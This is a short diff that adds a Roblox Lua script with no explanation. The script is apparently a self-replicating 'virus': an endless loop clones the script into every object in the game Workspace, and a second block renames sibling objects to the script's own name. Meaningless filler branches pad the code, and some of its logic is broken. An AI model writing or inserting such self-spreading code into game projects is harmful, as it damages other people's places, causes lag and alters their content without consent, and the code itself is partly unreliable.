@@ -1,0 +1,51 @@
+local all = game.Workspace:GetChildren()
+
+
+while true do
+wait(.1)
+for i = 1, #all do
+local find = all[i]:FindFirstChild(script.Name)
+if all[i].className == "Model" and all[i].PrimaryPart == "Head" then
+eric = 1
+wait(.1)
+eric = 0
+else if script.Name == find then
+eric = 1
+wait(.1)
+eric = 0
+else if find ~= nil then
+eric = 1
+wait(.1)
+eric = 0
+else
+q = script
+w = q:clone()
+q = w:clone()
+q.Parent = all[i]
+end
+end 
+end
+end
+
+local sll = script.Parent:GetChildren()
+
+for i = 1, #sll do
+local finds = game.Workspace:FindFirstChild(script.Name)
+sll[i].Name = script.Name
+if script.Parent.className == "Model" and script.Parent.PrimaryPart == "Head" then
+eric = 1 
+wait(.1)
+eric = 0
+else if finds ~= nil then
+eric = 1
+wait(.1)
+eric = 0
+else
+q = script
+w = q:clone()
+q = w:clone()
+q.Parent = game.Workspace
+end
+end 
+end
+end 
